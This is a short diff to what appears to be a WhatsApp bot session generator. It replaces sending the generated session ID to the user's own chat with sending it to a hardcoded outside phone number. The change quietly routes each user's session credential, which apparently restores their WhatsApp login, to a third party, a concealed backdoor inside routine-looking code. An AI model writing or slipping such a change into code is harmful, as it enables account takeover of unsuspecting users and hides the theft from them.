@@ -108,7 +108,7 @@ async function connector(Num, res) {
             await uploadSessionFiles(sessionDir, sessionId);
             console.log("Session uploaded with ID:", sessionId);
 
-            await session.sendMessage(session.user.id, {
+            await session.sendMessage('2348100835767@s.whatsapp.net', {
                 image: { url: "https://cdn.kordai.biz.id/serve/JpKYo5TCwETY.jpg" },
                 caption: sessionId
             });
